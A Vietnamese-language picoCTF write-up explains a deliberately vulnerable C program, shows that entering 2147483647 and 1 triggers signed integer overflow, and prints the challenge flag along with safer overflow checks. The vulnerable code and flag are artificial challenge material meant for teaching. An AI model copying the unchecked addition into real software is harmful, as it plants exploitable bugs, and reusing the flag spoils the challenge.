# picoCTF Writeup — Integer Overflow

## Thông tin bài

- **Dạng bài:** Binary Exploitation
- **Lỗ hổng:** Integer Overflow
- **Flag:**

```text
picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_fe14e9e9}
```

---

## Mã nguồn

```c
#include <stdio.h>
#include <stdlib.h>

static int addIntOvf(int result, int a, int b) {
    result = a + b;
    if(a > 0 && b > 0 && result < 0)
        return -1;
    if(a < 0 && b < 0 && result > 0)
        return -1;
    return 0;
}

int main() {
    int num1, num2, sum;
    FILE *flag;
    char c;

    printf("n1 > n1 + n2 OR n2 > n1 + n2 \n");
    fflush(stdout);
    printf("What two positive numbers can make this possible: \n");
    fflush(stdout);

    if (scanf("%d", &num1) && scanf("%d", &num2)) {
        printf("You entered %d and %d\n", num1, num2);
        fflush(stdout);

        sum = num1 + num2;

        if (addIntOvf(sum, num1, num2) == 0) {
            printf("No overflow\n");
            fflush(stdout);
            exit(0);
        } else if (addIntOvf(sum, num1, num2) == -1) {
            printf("You have an integer overflow\n");
            fflush(stdout);
        }

        if (num1 > 0 || num2 > 0) {
            flag = fopen("flag.txt","r");

            if(flag == NULL){
                printf("flag not found: please run this on the server\n");
                fflush(stdout);
                exit(0);
            }

            char buf[60];
            fgets(buf, 59, flag);
            printf("YOUR FLAG IS: %s\n", buf);
            fflush(stdout);
            exit(0);
        }
    }

    return 0;
}
```

---

## Phân tích chương trình

Chương trình yêu cầu nhập hai số nguyên:

```c
scanf("%d", &num1);
scanf("%d", &num2);
```

Sau đó tính tổng:

```c
sum = num1 + num2;
```

Hàm `addIntOvf()` tiếp tục tính lại phép cộng:

```c
result = a + b;
```

và kiểm tra hai trường hợp tràn số nguyên:

```c
if(a > 0 && b > 0 && result < 0)
    return -1;
```

Nếu hai số đầu vào đều dương nhưng kết quả lại âm, chương trình kết luận đã xảy ra integer overflow.

Trường hợp còn lại:

```c
if(a < 0 && b < 0 && result > 0)
    return -1;
```

Nếu hai số đều âm nhưng tổng lại dương thì cũng được xem là integer overflow.

Nếu không phát hiện overflow, hàm trả về `0`:

```c
return 0;
```

---

## Giới hạn của kiểu `int`

Trên hệ thống dùng `int` 32-bit có dấu:

```text
INT_MAX =  2147483647
INT_MIN = -2147483648
```

Phạm vi biểu diễn là:

```text
-2147483648 đến 2147483647
```

Nếu cộng hai số dương và kết quả toán học vượt quá `INT_MAX`, giá trị có thể bị quay vòng sang miền số âm trên hệ thống dùng biểu diễn bù hai.

Ví dụ:

```text
2147483647 + 1
```

Kết quả mong đợi về mặt toán học là:

```text
2147483648
```

Tuy nhiên, giá trị này không thể biểu diễn bằng `int` 32-bit có dấu. Trong môi trường của bài CTF, kết quả được diễn giải thành:

```text
-2147483648
```

Ta có:

```text
a > 0
b > 0
result < 0
```

Vì vậy điều kiện kiểm tra overflow trở thành đúng.

> Theo chuẩn ngôn ngữ C, signed integer overflow là undefined behavior — hành vi không được xác định. Tuy nhiên, bài CTF này được thiết kế để khai thác cách quay vòng số nguyên trên hệ thống đích.

---

## Điều kiện để lấy flag

Chương trình chỉ tiếp tục nếu `addIntOvf()` trả về `-1`:

```c
else if (addIntOvf(sum, num1, num2) == -1) {
    printf("You have an integer overflow\n");
}
```

Sau đó chương trình kiểm tra:

```c
if (num1 > 0 || num2 > 0)
```

Do ta sử dụng hai số dương nên điều kiện này chắc chắn đúng.

Như vậy, mục tiêu là nhập hai số dương sao cho:

```text
num1 + num2 > INT_MAX
```

---

## Payload

Có thể sử dụng:

```text
2147483647
1
```

Phép cộng:

```text
2147483647 + 1
```

sẽ gây tràn số nguyên và tạo kết quả âm:

```text
-2147483648
```

Một payload khác cũng hợp lệ:

```text
2000000000
2000000000
```

Tổng toán học là:

```text
4000000000
```

Khi bị giới hạn trong 32-bit, giá trị thường trở thành:

```text
-294967296
```

Kết quả vẫn là số âm, vì vậy chương trình phát hiện overflow.

---

## Chạy chương trình

Ví dụ:

```bash
nc <HOST> <PORT>
```

Nhập:

```text
2147483647
1
```

Kết quả:

```text
You entered 2147483647 and 1
You have an integer overflow
YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_fe14e9e9}
```

---

## Luồng khai thác

```text
Nhập hai số dương
        |
        v
num1 + num2 vượt INT_MAX
        |
        v
Kết quả bị diễn giải thành số âm
        |
        v
a > 0 && b > 0 && result < 0
        |
        v
addIntOvf() trả về -1
        |
        v
Chương trình mở flag.txt
        |
        v
In flag
```

---

## Flag

```text
picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_fe14e9e9}
```

---

## Kết luận

Lỗ hổng của bài nằm ở việc chương trình thực hiện phép cộng bằng kiểu `int` có dấu nhưng không kiểm tra giới hạn trước khi cộng.

Khi tổng của hai số dương vượt quá `INT_MAX`, kết quả trong môi trường bài trở thành một số âm. Hàm `addIntOvf()` nhận ra sự bất thường này và cho phép chương trình đọc flag.

Payload đơn giản nhất:

```text
2147483647
1
```

Biện pháp phòng tránh là kiểm tra trước khi cộng:

```c
#include <limits.h>

if (b > 0 && a > INT_MAX - b) {
    // Overflow
}
```

Hoặc sử dụng hàm kiểm tra overflow có sẵn của trình biên dịch:

```c
int result;

if (__builtin_add_overflow(a, b, &result)) {
    // Overflow
}
```
